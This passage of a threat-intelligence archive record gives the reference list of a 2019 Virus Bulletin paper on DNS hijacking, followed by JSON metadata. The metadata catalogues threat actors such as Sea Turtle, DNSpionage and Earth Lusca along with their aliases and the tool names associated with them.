2019.\nhttps://www.netnod.se/news/statement-on-man-in-the-middle-attack-against-netnod.\n\n[5] RFC 5730. https://tools.ietf.org/html/rfc5730.\n\n[6] List of root servers. IANA. https://www.iana.org/domains/root/servers.\n\n[7] Davis, K. There are not 13 root servers. ICANN. 15 November 2007. https://www.icann.org/\nnews/blog/there-are-not-13-root-servers.\n\n[8] Operational Statement on the Integrity of the Root Server System. 14 March 2019.\nhttps://root-servers.org/news/20190314-Rootops_statement_Integrity_of_root_server_\nsystem.pdf.\n\n[9] Alert (AA19-024A) DNS Infrastructure Hijacking Campaign. Department of Homeland\nSecurity. https://www.us-cert.gov/ncas/alerts/AA19-024A.\n\n[10] Dahl, M. Widespread DNS Hijacking Activity Targets Multiple Sectors. Crowdstrike. 25\nJanuary 2019. https://www.crowdstrike.com/blog/widespread-dns-hijacking-activity-targetsmultiple-sectors/.\n\n[11] CVE-2009-1151 Detail. https://nvd.nist.gov/vuln/detail/CVE-2009-1151.\n\n[12] CVE-2014-6271 Detail. https://nvd.nist.gov/vuln/detail/CVE-2014-6271.\n\n[13] Alert (TA14-268A) GNU Bourne-Again Shell (Bash) ‘Shellshock’ Vulnerability\n(CVE-2014-6271, CVE-2014-7169, CVE-2014-7186, CVE-2014-7187, CVE-2014-6277\nand CVE 2014-6278). Department of Homeland Security. https://www.us-cert.gov/ncas/\nalerts/TA14-268A. Shellshock.\n\n[14] CVE-2017-3881 Detail. https://nvd.nist.gov/vuln/detail/CVE-2017-3881.\n\n[15] CVE-2017-6736 Detail. https://nvd.nist.gov/vuln/detail/CVE-2017-6736.\n\n[16] CVE-2017-12617 Detail. https://nvd.nist.gov/vuln/detail/CVE-2017-12617.\n\n[17] CVE-2018-0296 Detail. https://nvd.nist.gov/vuln/detail/CVE-2018-0296.\n\n[18] CVE-2018-7600 Detail. https://nvd.nist.gov/vuln/detail/CVE-2018-7600.\n\n[19] Cafax. http://www.cafax.se/Home.html.\n\n[20] Woodcock, B. Ops Track 01/30/19 - Briefi ng on Dec 18 - Jan 19 DNS/IMAP Prepositioning\nAttacks - Bill Woodcock. https://www.youtube.com/watch?v=oNF6TE75mzg.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        },
        {
            "id": "6825b8cb-7d82-43d2-b0b0-d51c7e255b42",
            "created_at": "2023-01-06T13:46:37.642134Z",
            "updated_at": "2023-01-06T13:46:37.642134Z",
            "deleted_at": null,
            "name": "MISPGALAXY",
            "url": "https://www.misp-project.org/galaxy.html",
            "description": "MISP Galaxy Clusters",
            "reports": null
        }
    ],
    "references": [
        "https://www.virusbulletin.com/uploads/pdf/magazine/2019/VB2019-Mercer-Rascagneres.pdf"
    ],
    "report_names": [
        "VB2019-Mercer-Rascagneres.pdf"
    ],
    "threat_actors": [
        {
            "id": "b740943a-da51-4133-855b-df29822531ea",
            "created_at": "2022-10-25T15:50:23.604126Z",
            "updated_at": "2025-03-27T02:00:55.505366Z",
            "deleted_at": null,
            "main_name": "Equation",
            "aliases": [
                "Equation"
            ],
            "source_name": "MITRE:Equation",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "4632103e-8035-4a83-9ecb-c1e12e21288c",
            "created_at": "2022-10-25T16:07:23.542255Z",
            "updated_at": "2025-03-27T02:02:09.854487Z",
            "deleted_at": null,
            "main_name": "DNSpionage",
            "aliases": [],
            "source_name": "ETDA:DNSpionage",
            "tools": [
                "Agent Drable",
                "AgentDrable",
                "CACTUSPIPE",
                "DNSpionage",
                "DropperBackdoor",
                "Karkoff",
                "MailDropper",
                "OILYFACE"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "cfdd35af-bd12-4c03-8737-08fca638346d",
            "created_at": "2022-10-25T16:07:24.165595Z",
            "updated_at": "2025-03-27T02:02:10.128957Z",
            "deleted_at": null,
            "main_name": "Sea Turtle",
            "aliases": [
                "Cosmic Wolf",
                "Marbled Dust",
                "Silicon",
                "Teal Kurma",
                "UNC1326"
            ],
            "source_name": "ETDA:Sea Turtle",
            "tools": [
                "Drupalgeddon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "9f101d9c-05ea-48b9-b6f1-168cd6d06d12",
            "created_at": "2023-01-06T13:46:39.396409Z",
            "updated_at": "2025-03-27T02:00:03.074969Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "CHROMIUM",
                "ControlX",
                "Red Dev 10",
                "RedHotel",
                "Red Scylla",
                "TAG-22",
                "BRONZE UNIVERSITY",
                "AQUATIC PANDA",
                "Charcoal Typhoon",
                "BountyGlad"
            ],
            "source_name": "MISPGALAXY:Earth Lusca",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "8d76e350-dfb5-4733-800d-876de41f690d",
            "created_at": "2023-01-06T13:46:38.841887Z",
            "updated_at": "2025-03-27T02:00:02.932838Z",
            "deleted_at": null,
            "main_name": "DNSpionage",
            "aliases": [
                "COBALT EDGEWATER"
            ],
            "source_name": "MISPGALAXY:DNSpionage",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "6abcc917-035c-4e9b-a53f-eaee636749c3",
            "created_at": "2022-10-25T16:07:23.565337Z",
            "updated_at": "2025-03-27T02:02:09.868522Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "Bronze University",
                "Charcoal Typhoon",
                "Chromium",
                "Red Dev 10",
                "Red Scylla"
            ],
            "source_name": "ETDA:Earth Lusca",
            "tools": [
                "Agentemis",
                "AntSword",
                "BIOPASS",
                "BIOPASS RAT",
                "BadPotato",
                "Behinder",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "Doraemon",
                "FRP",
                "Fast Reverse Proxy",
                "FunnySwitch",
                "HUC Port Banner Scanner",
                "KTLVdoor",
                "Mimikatz",
                "NBTscan",
                "POISONPLUG.SHADOW",
                "PipeMon",
                "RbDoor",
                "RibDoor",
                "RouterGod",
                "SAMRID",
                "ShadowPad Winnti",
                "SprySOCKS",
                "WinRAR",
                "Winnti",
                "XShellGhost",
                "cobeacon",
                "fscan",
                "lcx",
                "nbtscan"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "3eebdb3f-f4e3-42e5-bb4d-f02a13328316",
            "created_at": "2024-05-01T02:03:08.014303Z",
            "updated_at": "2025-03-27T02:05:17.306592Z",
            "deleted_at": null,
            "main_name": "COBALT EDGEWATER",
            "aliases": [
                "Cold River ",
                "DNSpionage ",
                "APT34 "
            ],
            "source_name": "Secureworks:COBALT EDGEWATER",
            "tools": [
                " DNSpionage",
                " Karkoff",
                " MailDropper",
                " SideTwist",
                " TWOTONE",
                "AgentDrable"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "33ae2a40-02cd-4dba-8461-d0a50e75578b",
            "created_at": "2023-01-06T13:46:38.947314Z",
            "updated_at": "2025-03-27T02:00:02.959421Z",
            "deleted_at": null,
            "main_name": "Sea Turtle",
            "aliases": [
                "SILICON",
                "Teal Kurma",
                "UNC1326",
                "COSMIC WOLF",
                "Marbled Dust"
            ],
            "source_name": "MISPGALAXY:Sea Turtle",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d53593c3-2819-4af3-bf16-0c39edc64920",
            "created_at": "2022-10-27T08:27:13.212301Z",
            "updated_at": "2025-03-27T02:00:55.529662Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "Earth Lusca",
                "TAG-22",
                "Charcoal Typhoon",
                "CHROMIUM",
                "ControlX"
            ],
            "source_name": "MITRE:Earth Lusca",
            "tools": [
                "Mimikatz",
                "PowerSploit",
                "Tasklist",
                "certutil",
                "Cobalt Strike",
                "Winnti for Linux",
                "Nltest",
                "NBTscan",
                "ShadowPad"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1690596417,
    "ts_updated_at": 1743041735,
    "ts_creation_date": 1573120689,
    "ts_modification_date": 1573120711,
    "files": {
        "pdf": "https://archive.orkl.eu/2beb8524fab9f8f40c0501b712accf9a179e7272.pdf",
        "text": "https://archive.orkl.eu/2beb8524fab9f8f40c0501b712accf9a179e7272.txt",
        "img": "https://archive.orkl.eu/2beb8524fab9f8f40c0501b712accf9a179e7272.jpg"
    }
}